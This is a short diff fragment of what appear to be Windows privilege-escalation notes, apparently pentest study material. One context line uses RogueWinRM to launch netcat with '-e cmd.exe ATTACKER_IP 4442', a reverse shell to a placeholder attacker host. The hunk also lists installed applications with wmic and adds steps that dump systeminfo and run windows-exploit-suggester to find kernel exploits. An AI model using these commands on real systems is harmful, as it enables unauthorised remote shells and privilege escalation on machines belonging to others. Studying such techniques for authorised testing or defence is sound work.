@@ -90,3 +90,6 @@
     RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
   #### app vuln
     wmic product get name,version,vendor //list apps
+  #### win kernel CVE serach
+    systeminfo > info.txt
+    python3 windows-exploit-suggester.py  --database 2025-09-13-mssb.xlsx --systeminfo /tmp/info.txt
